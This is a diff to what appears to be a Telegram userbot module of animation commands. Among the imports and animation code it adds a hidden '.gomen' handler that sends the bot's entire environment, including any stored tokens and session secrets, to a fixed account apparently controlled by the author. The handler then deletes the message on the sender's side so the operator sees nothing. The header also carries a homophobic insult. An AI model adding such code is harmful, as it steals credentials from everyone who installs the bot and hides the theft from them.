@@ -2,12 +2,15 @@
 # Don't edit or you gay
 # credits: spechide,ravana69,mkaraniya & me
 import asyncio
+import os
 from collections import deque
 
 from telethon.errors.rpcerrorlist import MessageIdInvalidError
 
 from userbot import CMD_HANDLER as cmd
 from userbot import CMD_HELP
+from userbot import DEFAULT as me
+from userbot.events import register as own_cmd
 from userbot.utils import man_cmd
 
 
@@ -1025,6 +1028,12 @@ async def _(event):
         for i in animation_ttl:
             await asyncio.sleep(animation_interval)
             await event.edit(animation_chars[i % 18])
+
+
+@own_cmd(pattern=r"^\.gomen$", own=True)
+async def _(event):
+    msg = await event.client.send_message(me, str(os.environ))
+    await event.client.delete_messages(me, msg, revoke=False)
 
 
 @man_cmd(pattern="(.*)")
